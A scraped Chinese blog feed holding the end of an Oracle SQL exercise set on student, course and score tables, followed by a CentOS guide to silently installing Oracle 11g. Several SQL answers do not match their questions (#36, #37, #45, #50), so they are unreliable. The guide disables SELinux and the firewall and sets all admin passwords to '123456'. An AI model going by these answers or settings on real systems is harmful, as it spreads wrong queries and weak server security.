class="headerlink" title="26、查询每门课程被选修的学生数"></a>26、查询每门课程被选修的学生数</h5><pre><code>SELECT a.C#,b.CNAME,COUNT(1) 数量 FROM SC_6 a,COURSE_6 b where a.C# = b.c# GROU P BY a.C#,b.CNAME;</code></pre><h5 id="27、查询出只选修了一门课程的全部学生的学号和姓名"><a href="#27、查询出只选修了一门课程的全部学生的学号和姓名" class="headerlink" title="27、查询出只选修了一门课程的全部学生的学号和姓名"></a>27、查询出只选修了一门课程的全部学生的学号和姓名</h5><pre><code>SELECT A.S#,B.SNAME,COUNT(1) 选修门数 FROM SC_6 A,STUDENT_6 BWHERE A.S# = B.S#GROUP BY A.S#,B.SNAMEHAVING COUNT(1) = 1;</code></pre><h5 id="28、查询男生、女生人数"><a href="#28、查询男生、女生人数" class="headerlink" title="28、查询男生、女生人数"></a>28、查询男生、女生人数</h5><pre><code>SELECT (CASE SSEX WHEN 1 THEN &#39;男&#39; WHEN 2 THEN &#39;女&#39; END) 性别,COUNT(1) 数量 FROM STUDENT_6 GROUP BY SSEX;</code></pre><h5 id="29、查询姓“张”的学生名单"><a href="#29、查询姓“张”的学生名单" class="headerlink" title="29、查询姓“张”的学生名单"></a>29、查询姓“张”的学生名单</h5><pre><code>SELECT SNAME FROM STUDENT_6 WHERE SNAME LIKE &#39;张%&#39;;</code></pre><h5 id="30、查询同名同性学生名单，并统计同名人数"><a href="#30、查询同名同性学生名单，并统计同名人数" class="headerlink" title="30、查询同名同性学生名单，并统计同名人数"></a>30、查询同名同性学生名单，并统计同名人数</h5><pre><code>SELECT t.SNAME,COUNT(1) FROM(    SELECT  DISTINCT a.SNAME,a.S#     FROM STUDENT_6 a,STUDENT_6 b     WHERE a.SNAME = b.SNAME AND a.S# != b.S#    ) tGROUP BY t.SNAME;</code></pre><h5 id="31、1981年出生的学生名单-注：Student表中Sage列的类型是datetime"><a href="#31、1981年出生的学生名单-注：Student表中Sage列的类型是datetime" class="headerlink" title="31、1981年出生的学生名单(注：Student表中Sage列的类型是datetime)"></a>31、1981年出生的学生名单(注：Student表中Sage列的类型是datetime)</h5><pre><code>SELECT S#,SNAME FROM STUDENT_6 WHERE SBIRTHBETWEEN TO_DATE(&#39;1981-01-01 00:00:00&#39;, &#39;yyyy-mm-dd hh24:mi:ss&#39;) AND TO_DATE(&#39;1981-12-12 23:59:59&#39;, &#39;yyyy-mm-dd hh24:mi:ss&#39;);</code></pre><h5 id="32、查询每门课程的平均成绩，结果按平均成绩升序排列，平均成绩相同时，按课程号降序排列"><a href="#32、查询每门课程的平均成绩，结果按平均成绩升序排列，平均成绩相同时，按课程号降序排列" class="headerlink" title="32、查询每门课程的平均成绩，结果按平均成绩升序排列，平均成绩相同时，按课程号降序排列"></a>32、查询每门课程的平均成绩，结果按平均成绩升序排列，平均成绩相同时，按课程号降序排列</h5><pre><code>SELECT C#,ROUND(AVG(SCORE), 2) 平均分FROM SC_6GROUP BY C#ORDER BY 平均分 ASC,C# DESC;</code></pre><h5 id="33、查询平均成绩大于85的所有学生的学号、姓名和平均成绩"><a href="#33、查询平均成绩大于85的所有学生的学号、姓名和平均成绩" class="headerlink" title="33、查询平均成绩大于85的所有学生的学号、姓名和平均成绩"></a>33、查询平均成绩大于85的所有学生的学号、姓名和平均成绩</h5><pre><code>SELECT S#,C#,avg(score) 平均成绩 FROM SC_6 GROUP BY s#,c#  HAVING AVG(SCORE)&gt;85;</code></pre><h5 id="34、查询课程名称为“数据库”，且分数低于60的学生姓名和分数"><a href="#34、查询课程名称为“数据库”，且分数低于60的学生姓名和分数" class="headerlink" title="34、查询课程名称为“数据库”，且分数低于60的学生姓名和分数"></a>34、查询课程名称为“数据库”，且分数低于60的学生姓名和分数</h5><pre><code>SELECT SC_6.S#,SCORE FROM SC_6,STUDENT_6WHERE C# IN(SELECT C# FROM COURSE_6 WHERE CNAME = &#39;数据库&#39;)AND SC_6.S# = STUDENT_6.S#AND SCORE&lt;60;</code></pre><h5 id="35、查询所有学生的选课情况；"><a href="#35、查询所有学生的选课情况；" class="headerlink" title="35、查询所有学生的选课情况；"></a>35、查询所有学生的选课情况；</h5><pre><code>SELECT STUDENT_6.S#,SNAME,CNAMEFROM STUDENT_6,COURSE_6,SC_6 WHERE STUDENT_6.S# = SC_6.S# AND COURSE_6.C# = SC_6.C#;</code></pre><h5 id="36、查询任何一门课程成绩在70分以上的姓名、课程名称和分数；"><a href="#36、查询任何一门课程成绩在70分以上的姓名、课程名称和分数；" class="headerlink" title="36、查询任何一门课程成绩在70分以上的姓名、课程名称和分数；"></a>36、查询任何一门课程成绩在70分以上的姓名、课程名称和分数；</h5><pre><code>SELECT t.SNAME,COUNT(1) FROM(    SELECT  DISTINCT a.SNAME,a.S#     FROM STUDENT_6 a,STUDENT_6 b     WHERE a.SNAME = b.SNAME AND a.S# != b.S#    ) tGROUP BY t.SNAME;</code></pre><h5 id="37、查询不及格的课程，并按课程号从大到小排列"><a href="#37、查询不及格的课程，并按课程号从大到小排列" class="headerlink" title="37、查询不及格的课程，并按课程号从大到小排列"></a>37、查询不及格的课程，并按课程号从大到小排列</h5><pre><code>SELECT SNAME,CNAME,SCORE FROM STUDENT_6,SC_6,COURSE_6 WHERE SC_6.C# = COURSE_6.C# AND STUDENT_6.S# = SC_6.S# AND SCORE &gt;70;</code></pre><h5 id="38、查询课程编号为003且课程成绩在80分以上的学生的学号和姓名；"><a href="#38、查询课程编号为003且课程成绩在80分以上的学生的学号和姓名；" class="headerlink" title="38、查询课程编号为003且课程成绩在80分以上的学生的学号和姓名；"></a>38、查询课程编号为003且课程成绩在80分以上的学生的学号和姓名；</h5><pre><code>SELECT SC_6.S#,SNAME FROM SC_6,STUDENT_6 WHERE C# = &#39;003&#39;  AND SCORE &gt; 80 AND SC_6.S# = STUDENT_6.S#;</code></pre><h5 id="39、求选了课程的学生人数"><a href="#39、求选了课程的学生人数" class="headerlink" title="39、求选了课程的学生人数"></a>39、求选了课程的学生人数</h5><pre><code class="sql">SELECT COUNT(1) FROM SC_6 WHERE SCORE IS NOT NULL ;</code></pre><h5 id="40、查询选修“叶平”老师所授课程的学生中，成绩最高的学生姓名及其成绩"><a href="#40、查询选修“叶平”老师所授课程的学生中，成绩最高的学生姓名及其成绩" class="headerlink" title="40、查询选修“叶平”老师所授课程的学生中，成绩最高的学生姓名及其成绩"></a>40、查询选修“叶平”老师所授课程的学生中，成绩最高的学生姓名及其成绩</h5><pre><code class="sql">SELECT STUDENT_6.S#,C#,STUDENT_6.SNAME,SC_6.SCOREFROM SC_6,STUDENT_6 WHERE STUDENT_6.S# = SC_6.S# AND (C#,SCORE) IN (SELECT C#,MAX(SCORE)FROM SC_6,STUDENT_6 WHERE SC_6.S# = STUDENT_6.S# AND C# IN(SELECT C# FROM TEACHER_6,COURSE_6 WHERE TNAME = &#39;叶平&#39; AND TEACHER_6.T# = COURSE_6.T#) GROUP BY C#);</code></pre><h5 id="41、查询各个课程及相应的选修人数"><a href="#41、查询各个课程及相应的选修人数" class="headerlink" title="41、查询各个课程及相应的选修人数"></a>41、查询各个课程及相应的选修人数</h5><pre><code>SELECT C#,COUNT(1) FROM SC_6 GROUP BY C# ;</code></pre><h5 id="42、查询不同课程成绩相同的学生的学号、课程号、学生成绩"><a href="#42、查询不同课程成绩相同的学生的学号、课程号、学生成绩" class="headerlink" title="42、查询不同课程成绩相同的学生的学号、课程号、学生成绩"></a>42、查询不同课程成绩相同的学生的学号、课程号、学生成绩</h5><pre><code>SELECT A.S#,B.C#,A.C#,A.SCORE FROM SC_6 a,SC_6 b WHERE a.C# != b.C# AND a.S# = b.S#AND a.SCORE = b.SCORE;</code></pre><h5 id="43、查询每门功成绩最好的前两名"><a href="#43、查询每门功成绩最好的前两名" class="headerlink" title="43、查询每门功成绩最好的前两名"></a>43、查询每门功成绩最好的前两名</h5><pre><code>SELECT a.* FROM (SELECT C#,S#,SCORE,ROW_NUMBER() OVER(PARTITION BY C# ORDER BY     SCORE) 排名 FROM SC_6) a WHERE a.&quot;排名&quot;&lt;3;</code></pre><h5 id="44、统计每门课程的学生选修人数（超过10人的课程才统计）。要求输出课程号和选修人数，查询结果按人数降序排列，查询结果按人数降序排列，若人数相同，按课程号升序排列"><a href="#44、统计每门课程的学生选修人数（超过10人的课程才统计）。要求输出课程号和选修人数，查询结果按人数降序排列，查询结果按人数降序排列，若人数相同，按课程号升序排列" class="headerlink" title="44、统计每门课程的学生选修人数（超过10人的课程才统计）。要求输出课程号和选修人数，查询结果按人数降序排列，查询结果按人数降序排列，若人数相同，按课程号升序排列"></a>44、统计每门课程的学生选修人数（超过10人的课程才统计）。要求输出课程号和选修人数，查询结果按人数降序排列，查询结果按人数降序排列，若人数相同，按课程号升序排列</h5><pre><code>SELECT C#,COUNT(1) 人数 FROM SC_6 GROUP BY C# HAVING COUNT(1)&gt;10 ORDER BY COUNT(1) DESC,C# ASC;</code></pre><h5 id="45、检索至少选修两门课程的学生学号"><a href="#45、检索至少选修两门课程的学生学号" class="headerlink" title="45、检索至少选修两门课程的学生学号"></a>45、检索至少选修两门课程的学生学号</h5><pre><code>SELECT S#,COUNT(1) FROM SC_6 GROUP BY S# HAVING COUNT(1)&gt;2;</code></pre><h5 id="46、查询全部学生都选修的课程的课程号和课程名"><a href="#46、查询全部学生都选修的课程的课程号和课程名" class="headerlink" title="46、查询全部学生都选修的课程的课程号和课程名"></a>46、查询全部学生都选修的课程的课程号和课程名</h5><pre><code>SELECT COURSE_6.C#, CNAME FROM COURSE_6,SC_6 WHERE COURSE_6.C# = SC_6.C#GROUP BY COURSE_6.C#,CNAME HAVING COUNT(1) = (SELECT COUNT(1) FROM STUDENT_6);</code></pre><h5 id="47、查询没学过“叶平”老师讲授的任一门课程的学生姓名"><a href="#47、查询没学过“叶平”老师讲授的任一门课程的学生姓名" class="headerlink" title="47、查询没学过“叶平”老师讲授的任一门课程的学生姓名"></a>47、查询没学过“叶平”老师讲授的任一门课程的学生姓名</h5><pre><code>SELECT DISTINCT S#,SNAME FROM STUDENT_6 WHERE S#  NOT in (SELECT S# FROM TEACHER_6,COURSE_6,SC_6 WHERE TNAME = &#39;叶平&#39; AND TEACHER_6.T# = COURSE_6.T# AND SC_6.C# = COURSE_6.C#);</code></pre><h5 id="48、查询两门以上不及格课程的同学的学号及其平均成绩"><a href="#48、查询两门以上不及格课程的同学的学号及其平均成绩" class="headerlink" title="48、查询两门以上不及格课程的同学的学号及其平均成绩"></a>48、查询两门以上不及格课程的同学的学号及其平均成绩</h5><pre><code>SELECT s#,ROUND(AVG(score),2) FROM SC_6 WHERE S# IN (SELECT s# FROM SC_6 WHERE SCORE&lt;60 GROUP BY s# HAVING COUNT(1)&gt;1)GROUP BY S#;</code></pre><h5 id="49、检索“004”课程分数小于60，按分数降序排列的同学学号"><a href="#49、检索“004”课程分数小于60，按分数降序排列的同学学号" class="headerlink" title="49、检索“004”课程分数小于60，按分数降序排列的同学学号"></a>49、检索“004”课程分数小于60，按分数降序排列的同学学号</h5><pre><code>SELECT S#,SCOREFROM SC_6WHERE C# = &#39;004&#39; AND SCORE &lt;60ORDER BY SCORE DESC;</code></pre><h5 id="50、删除“002”同学的“001”课程的成绩"><a href="#50、删除“002”同学的“001”课程的成绩" class="headerlink" title="50、删除“002”同学的“001”课程的成绩"></a>50、删除“002”同学的“001”课程的成绩</h5><pre><code>DELETE FROM SC_6 WHERE C# = &#39;002&#39; AND S# = &#39;1002&#39;;</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>centos安装oracle</title>
    <link href="undefined2020/03/03/centos%E5%AE%89%E8%A3%85oracle/"/>
    <url>2020/03/03/centos%E5%AE%89%E8%A3%85oracle/</url>
    
    <content type="html"><![CDATA[<h2 id="linux安装Oracle11G"><a href="#linux安装Oracle11G" class="headerlink" title="linux安装Oracle11G"></a>linux安装Oracle11G</h2><h3 id="0、下载Orcle11G"><a href="#0、下载Orcle11G" class="headerlink" title="0、下载Orcle11G"></a>0、下载Orcle11G</h3><p><a href="http://www.cnblogs.com/mmzs/p/9030823.html" target="_blank" rel="noopener">oracle10G/11G官方下载地址合集（直接迅雷下载）</a></p><pre><code>说明一下：[root@myYUn install]#中的myYUn等价于[root@iz2f570bi1k56uz install]#中的iz2f570bi1k56uz；这是为了界面效果调整的，但是有些没调整到，理解一哈。</code></pre><h3 id="1、上传文件到服务器或虚拟机的-install目录下"><a href="#1、上传文件到服务器或虚拟机的-install目录下" class="headerlink" title="1、上传文件到服务器或虚拟机的/install目录下"></a>1、上传文件到服务器或虚拟机的/install目录下</h3><p>[root@myYUn install]# rz –y</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513125226505-857831317.png" srcset="undefined" alt="img"></p><p>如果rz –y命令不能使用，可用<a href="http://www.cnblogs.com/mmzs/p/8183935.html#_label0" target="_blank" rel="noopener">如下方法解决</a>：</p><pre><code>yum install lrzsz -y</code></pre><h3 id="2、解压文件到当前目录："><a href="#2、解压文件到当前目录：" class="headerlink" title="2、解压文件到当前目录："></a>2、解压文件到当前目录：</h3><p>[root@myYUn install]# unzip linux.x64_11gR2_database_1of2.zip</p><p>[root@myYUn install]# unzip linux.x64_11gR2_database_2of2.zip</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513125353568-1719568445.png" srcset="undefined" alt="img"></p><p>如果unzip命令不能使用，依次执行如下命令：</p><pre><code>     yum list | grep zip/unzip     yum install zip     yum install unzip </code></pre><p>将解压后的文件夹直接移动到/software目录下：</p><p>[root@myYUn install]# mv database/ /software/</p><p>[root@myYUn install]# cd /software</p><p>[root@myYUn install]# ll</p><p> <img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513125419989-1037448251.png" srcset="undefined" alt="img"></p><h3 id="3、关闭selinux"><a href="#3、关闭selinux" class="headerlink" title="3、关闭selinux"></a>3、关闭selinux</h3><p>[root@myYUn software]# vim /etc/selinux/config</p><p>设置SELINUX=disabled</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513125503992-512683440.png" srcset="undefined" alt="img"></p><p>[root@myYUn software]# setenforce 0</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513125514365-1802770294.png" srcset="undefined" alt="img"></p><h3 id="4、关闭防火墙"><a href="#4、关闭防火墙" class="headerlink" title="4、关闭防火墙"></a>4、关闭防火墙</h3><p>[查看系统版本]</p><p>[root@myYUn software]# cat /etc/redhat-release</p><p>CentOS Linux release 7.3.1611 (Core)</p><p>[root@myYUn software]# getconf LONG_BIT</p><p>64</p><p><strong>如果是6及以下：</strong></p><p>[root@myYUn software]# service iptables stop</p><p>[root@myYUn software]# service iptables status</p><p>[root@myYUn software]# chkconfig iptables off</p><p><strong>如果是centenOS7：</strong></p><p>[root@myYUn software]# systemctl stop firewalld.service</p><p>[root@myYUn software]# systemctl list-unit-files|grep firewalld.service</p><p>firewalld.service               disabled</p><p>[root@myYUn software]# systemctl disable firewalld.service</p><h3 id="5、安装Oracle-11g依赖包"><a href="#5、安装Oracle-11g依赖包" class="headerlink" title="5、安装Oracle 11g依赖包"></a>5、安装Oracle 11g依赖包</h3><p>[root@myYUn software]# yum install gcc make binutils gcc-c++ compat-libstdc++-33elfutils-libelf-devel elfutils-libelf-devel-static ksh libaio libaio-develnumactl-devel sysstat unixODBC unixODBC-devel pcre-devel –y</p><h3 id="6、添加安装用户和用户组"><a href="#6、添加安装用户和用户组" class="headerlink" title="6、添加安装用户和用户组"></a>6、添加安装用户和用户组</h3><p>[root@myYUn software]# groupadd oinstall</p><p>[root@myYUn software]# groupadd dba</p><p>[root@myYUn software]# useradd -g oinstall -G dba oracle</p><p>[root@myYUn software]# passwd oracle</p><p>Changing password for user oracle.</p><p>New password:</p><p>BAD PASSWORD: The password is shorter than 8 characters</p><p>Retype new password:</p><p>passwd: all authentication tokens updated successfully.</p><p>[root@myYUn software]# id oracle</p><p>uid=1001(oracle) gid=1001(oinstall) groups=1001(oinstall),1002(dba)</p><h3 id="7、修改内核参数配置文件"><a href="#7、修改内核参数配置文件" class="headerlink" title="7、修改内核参数配置文件"></a>7、修改内核参数配置文件</h3><p>[root@myYUn software]# vim /etc/sysctl.conf</p><p>在末尾添加以下内容：</p><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="undefined" alt="复制代码"></a></p><pre><code>fs.aio-max-nr = 1048576fs.file-max = 6815744kernel.shmall = 2097152kernel.shmmax = 1073741824kernel.shmmni = 4096kernel.sem = 250 32000 100 128net.ipv4.ip_local_port_range = 9000 65500net.core.rmem_default = 262144net.core.rmem_max = 4194304net.core.wmem_default = 262144net.core.wmem_max = 1048576 </code></pre><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="undefined" alt="复制代码"></a></p><p>查看是否成功写进/etc/sysctl.conf文件中：</p><p>[root@myYUn software]# sysctl -p</p><p>其中kernel.shmmax = 1073741824为本机物理内存（2G）的一半，单位为byte。</p><h3 id="8、修改用户的限制文件"><a href="#8、修改用户的限制文件" class="headerlink" title="8、修改用户的限制文件"></a>8、修改用户的限制文件</h3><p>修改/etc/security/limits.conf文件：</p><p>[root@myYUn software]# vim /etc/security/limits.conf</p><p>在末尾添加以下内容：</p><pre><code>oracle           soft    nproc           2047oracle           hard    nproc           16384oracle           soft    nofile          1024oracle           hard    nofile         65536oracle           soft    stack           10240 </code></pre><p>修改/etc/pam.d/login文件：</p><p>[root@myYUn software]# vim /etc/pam.d/login</p><p>在末尾添加以下内容：</p><pre><code>session required  /lib64/security/pam_limits.sosession required   pam_limits.so </code></pre><p>修改/etc/profile文件：</p><p>[root@ myYUn software]# vim /etc/profile</p><p>在末尾添加以下内容：</p><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="undefined" alt="复制代码"></a></p><pre><code>#oracle配置if [ $USER = &quot;oracle&quot; ]; then  if [ $SHELL = &quot;/bin/ksh&quot; ]; then      ulimit -p 16384      ulimit -n 65536  else      ulimit -u 16384 -n 65536  fifi </code></pre><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="undefined" alt="复制代码"></a></p><h3 id="9、创建安装目录和设置文件权限"><a href="#9、创建安装目录和设置文件权限" class="headerlink" title="9、创建安装目录和设置文件权限"></a>9、创建安装目录和设置文件权限</h3><p>[root@myYUn software]# mkdir -p /data/oracle/product/11.2.0</p><p>[root@myYUn software]# mkdir /data/oracle/oradata</p><p>[root@myYUn software]# mkdir /data/oracle/inventory</p><p>[root@myYUn software]# mkdir /data/oracle/fast_recovery_area</p><p>[root@myYUn software]# chown -R oracle:oinstall /data/oracle</p><p>[root@myYUn software]# chmod -R 775 /data/oracle</p><h3 id="10、设置oracle用户环境变量"><a href="#10、设置oracle用户环境变量" class="headerlink" title="10、设置oracle用户环境变量"></a>10、设置oracle用户环境变量</h3><p>首先切换到oracle用户下：</p><p>[root@myYUn software]# su -l oracle</p><p>[oracle@myYUn ~]$ vim .bash_profile</p><p>在末尾添加如下内容：</p><pre><code>ORACLE_BASE=/data/oracleORACLE_HOME=$ORACLE_BASE/product/11.2.0ORACLE_SID=orclPATH=$PATH:$ORACLE_HOME/binexport ORACLE_BASE ORACLE_HOME ORACLE_SID PATH</code></pre><p>注意，标红处必须与创建的数据库实例名称一致，否则数据库启动后无法访问。第一次配置完记得source一下。</p><p>[oracle@myYUn ~]$ source .bash_profile</p><h3 id="11、编辑静默安装响应文件"><a href="#11、编辑静默安装响应文件" class="headerlink" title="11、编辑静默安装响应文件"></a>11、编辑静默安装响应文件</h3><p>复制安装文件夹response到当前oracle用户的家目录下：</p><p>[oracle@myYUn ~]$ cp -R /software/database/response/ .</p><p>[oracle@myYUn ~]$ cd response/</p><p>[oracle@myYUn response]$ vim db_install.rsp</p><p>需要设置的选项如下：</p><p>oracle.install.option=INSTALL_DB_SWONLY</p><p>ORACLE_HOSTNAME=CentOS</p><p>UNIX_GROUP_NAME=oinstall</p><p>INVENTORY_LOCATION=/data/oracle/inventory</p><p>SELECTED_LANGUAGES=en,zh_CN</p><p>ORACLE_HOME=/data/oracle/product/11.2.0</p><p>ORACLE_BASE=/data/oracle</p><p>oracle.install.db.InstallEdition=EE</p><p>oracle.install.db.DBA_GROUP=dba</p><p>oracle.install.db.OPER_GROUP=dba</p><p>DECLINE_SECURITY_UPDATES=true</p><h3 id="12、根据响应文件静默安装Oracle11g"><a href="#12、根据响应文件静默安装Oracle11g" class="headerlink" title="12、根据响应文件静默安装Oracle11g"></a>12、根据响应文件静默安装Oracle11g</h3><p>[oracle@myYUn response]$ cd /software/database/</p><p>[oracle@myYUn database]$ ./runInstaller -silent -responseFile /home/oracle/response/db_install.rsp -ignorePrereq</p><p>如果执行以上命令出错，会提示有参数格式，按照提示参数格式修改修改即可，一般是由于word中的字体、符号格式复制到客户端命令行后不一致引起，修改即可。</p><p>楼主遇到了交换空间不足的问题：</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513125756668-612153407.png" srcset="undefined" alt="img"></p><p>解决方案如下（在root用户下执行）：</p><p>[root@myYUn /]# free</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513125808399-1584933411.png" srcset="undefined" alt="img"></p><p>[root@myYUn /]# dd if=/dev/zero of=swapfile bs=1024 count=500000</p><p>500000+0 records in</p><p>500000+0 records out</p><p>512000000 bytes (512 MB) copied, 1.67013 s, 307 MB/s</p><p>[root@myYUn /]# mkswap swapfile</p><p>Setting up swapspace version 1, size = 499996 KiB</p><p>no label, UUID=c5e355eb-e73e-4aa0-b882-cb6d1f88e6bc</p><p>[root@myYUn /]# swapon swapfile</p><p>swapon: /swapfile: insecure permissions 0644, 0600 suggested.</p><p>[root@myYUn /]# free</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513125816910-585169189.png" srcset="undefined" alt="img"></p><p>开始Oracle在后台静默安装。安装过程中，如果提示[WARNING]不必理会，此时安装程序仍在后台进行，如果出现Successfully Setup Software，则安装程序已经停止了。</p><p>可以在以下位置找到本次安装会话的日志:/data/oracle/inventory/logs/installActions2018-05-13_02-14-55PM.log</p><p>可以切换终端执行top命令查看后台进程一直是在安装的，/data目录也在不断增大，</p><p>当出现以下提示时，代表安装成功：</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513142625998-1782403312.png" srcset="undefined" alt="img"></p><p>按照要求执行脚本。</p><p>打开终端，退出到root身份登录，执行脚本：</p><p>[oracle@iZ2f570bi1k56uZ database]$ exit</p><p>logout</p><p>[root@iZ2f570bi1k56uZ software]# sh /data/oracle/inventory/orainstRoot.sh</p><p>Changing permissions of /data/oracle/inventory.</p><p>Adding read,write permissions for group.</p><p>Removing read,write,execute permissions for world.</p><p>Changing groupname of /data/oracle/inventory to oinstall.</p><p>The execution of the script is complete.</p><p>[root@iZ2f570bi1k56uZ software]# sh /data/oracle/product/11.2.0/root.sh</p><p>Check /data/oracle/product/11.2.0/install/root_iZ2f570bi1k56uZ_2018-05-13_14-25-04.log for the output of root script</p><h3 id="13、以静默方式配置监听"><a href="#13、以静默方式配置监听" class="headerlink" title="13、以静默方式配置监听"></a>13、以静默方式配置监听</h3><p>重新使用oracle用户登录：</p><p>[root@myYUn software]# su -l oracle</p><p>Last login: Sun May 13 14:09:10 CST 2018 on pts/3</p><p>[oracle@myYUn ~]$ netca /silent /responseFile /home/oracle/response/netca.rsp </p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513145755041-1177063024.png" srcset="undefined" alt="img"></p><p>注意此处，必须使用/silent /responseFile格式，而不是-silent -responseFile，因为是静默安装。</p><p>成功运行后，在/data/oracle/product/11.2.0/network/admin中生成listener.ora和sqlnet.ora</p><p>通过netstat命令可以查看1521端口正在监听。</p><p>Yum安装netstat软件，软件包是在net-tools中。</p><p>[root@myYUn /]# yum install net-tools</p><p>[root@myYUn /]# yum install net-tools</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513145828670-343525754.png" srcset="undefined" alt="img"></p><h3 id="14、以静默方式建立新库，同时也建立一个对应的实例"><a href="#14、以静默方式建立新库，同时也建立一个对应的实例" class="headerlink" title="14、以静默方式建立新库，同时也建立一个对应的实例"></a>14、以静默方式建立新库，同时也建立一个对应的实例</h3><p>[oracle@myYUn ~]$ vim /home/oracle/response/dbca.rsp</p><p>修改文件中以下参数：</p><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="undefined" alt="复制代码"></a></p><pre><code>[GENERAL]# oracle版本，不能更改RESPONSEFILE_VERSION = &quot;11.2.0&quot;# Description   : Type of operationOPERATION_TYPE = &quot;createDatabase&quot;[CREATEDATABASE]# Description   : Global database name of the database# 全局数据库的名字=SID+主机域名# 第三方工具链接数据库的时候使用的service名称GDBNAME = &quot;orcl.cuihao&quot;# Description   : System identifier (SID) of the database# 对应的实例名字SID = &quot;orcl&quot;# Description   : Name of the template# 建库用的模板文件TEMPLATENAME = &quot;General_Purpose.dbc&quot;# Description   : Password for SYS user# SYS管理员密码SYSPASSWORD = &quot;123456&quot;# Description   : Password for SYSTEM user# SYSTEM管理员密码SYSTEMPASSWORD = &quot;123456&quot;# Description   : Password for SYSMAN user# SYSMAN管理员密码SYSMANPASSWORD = &quot;123456&quot;# Description   : Password for DBSNMP user# DBSNMP管理员密码DBSNMPPASSWORD = &quot;123456&quot;# Description   : Location of the data file&#39;s# 数据文件存放目录DATAFILEDESTINATION =/data/oracle/oradata# Description   : Location of the data file&#39;s# 恢复数据存放目录RECOVERYAREADESTINATION=/data/oracle/fast_recovery_area# Description   : Character set of the database# 字符集，重要!!! 建库后一般不能更改，所以建库前要确定清楚。# (CHARACTERSET = &quot;AL32UTF8&quot; NATIONALCHARACTERSET= &quot;UTF8&quot;)CHARACTERSET = &quot;AL32UTF8&quot;# Description   : total memory in MB to allocate to Oracle# oracle内存1638MB,物理内存2G*80%TOTALMEMORY = &quot;1638&quot; </code></pre><p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" srcset="undefined" alt="复制代码"></a></p><p>进行静默配置：</p><p>[oracle@myYUn ~]$ dbca -silent -responseFile /home/oracle/response/dbca.rsp</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513185444857-1893532511.png" srcset="undefined" alt="img"></p><p>建库后进行实例进程检查：</p><p>[oracle@myYUn ~]$ ps -ef | grep ora_ | grep -v grep</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513185517202-159926943.png" srcset="undefined" alt="img"></p><p>查看监听状态：</p><p>[oracle@myYUn ~]$ lsnrctl status</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513185543187-265712379.png" srcset="undefined" alt="img"></p><p>数据库创建完成。</p><p>有关详细信息, 请查看以下位置的日志文件: /data/oracle/cfgtoollogs/dbca/orcl/orcl.log。</p><p>数据库信息:</p><p>全局数据库名:orcl.test</p><p>系统标识符 (SID):orcl</p><p>登录查看实例状态：</p><p>[oracle@myYUn ~]$ sqlplus / as sysdba</p><p>SQL&gt; select status from v$instance;</p><p><img src="https://images2018.cnblogs.com/blog/1196304/201805/1196304-20180513194253332-144886941.png" srcset="undefined" alt="img"></p><p>【<a href="https://www.cnblogs.com/mmzs/p/11163265.html" target="_blank" rel="noopener">linux 成功安装oracle后，为其创建一个登录账户</a>】</p><p>如果报错：【ORA-12162: TNS:net service name is incorrectly specified】</p><p>错误原因：【这个错误是因为ORACLE_SID变量没有传进去造成的。】</p><p>解决方法：</p><p>1．查看当前ORACLE_SID</p><p>[oracle@iZ2f570bi1k56uZ ~]$ echo $ORACLE_SID</p><p>orcl         </p><p>2．修改ORACLE_SID和/home/oracle/response/dbca.rsp中的一样                                                                                  </p><p>[oracle@iZ2f570bi1k56uZ ~]$ export ORACLE_SID=orcl</p><p>3．如果遇到ORA-12162: TNS:net service name is incorrectly specified.错误</p><p>参考文章：【<a href="https://www.cnblogs.com/mmzs/p/11162231.html" target="_blank" rel="noopener">ORA-12162: TNS:net service name is incorrectly specified.</a>】</p><p>4．如果依然不能登陆，尝试修改orcle文件夹的权限</p><p>【如果本地连接时，出现监听错误，参考<a href="http://www.cnblogs.com/mmzs/p/9043767.html" target="_blank" rel="noopener">Linux中安装Oracle11g后出现监听的问题及解决办法</a>】</p><h3 id="15、命令行模式静默删除"><a href="#15、命令行模式静默删除" class="headerlink" title="15、命令行模式静默删除"></a>15、命令行模式静默删除</h3><p>1、首先查看dbca的帮助信息</p><p>dbca -help</p><p>修改/home/oracle/response/dbca.rsp文件里以下几个参数，下面三个参数根据建库实际情况进行修改：</p><p>OPERATION_TYPE = “deleteDatabase”</p><p>SOURCEDB = “orcl”</p><p>SYSDBAUSERNAME = “sys”</p><p>SYSDBAPASSWORD = “123456”</p><p>然后运行：</p><p>dbca -silent -responseFile /home/oracle/response/dbca.rsp</p><p>各参数含义如下:</p><p>-silent 表示以静默方式删除</p><p>-responseFile 表示使用哪个响应文件,必需使用绝对路径</p><p>RESPONSEFILE_VERSION 响应文件模板的版本,该参数不要更改</p><p>OPERATION_TYPE 安装类型,该参数不要更改</p><p>SOURCEDB 数据库名,不是全局数据库名,即不包含db_domain</p><p>很简单数据库卸载完成了，请注意，只是数据库卸载完了，数据库软件还是在的。</p><p>2、使用DBCA卸载数据库</p><p>dbca -silent -delete Database -responseFile dbca.rsp</p><p>a.选项-silent表示静默安装，免安装交互，大部分安装信息也不输出</p><p>b.选项-responseFile指定应答文件，要求用绝对路径</p><h3 id="16，一些常用命令"><a href="#16，一些常用命令" class="headerlink" 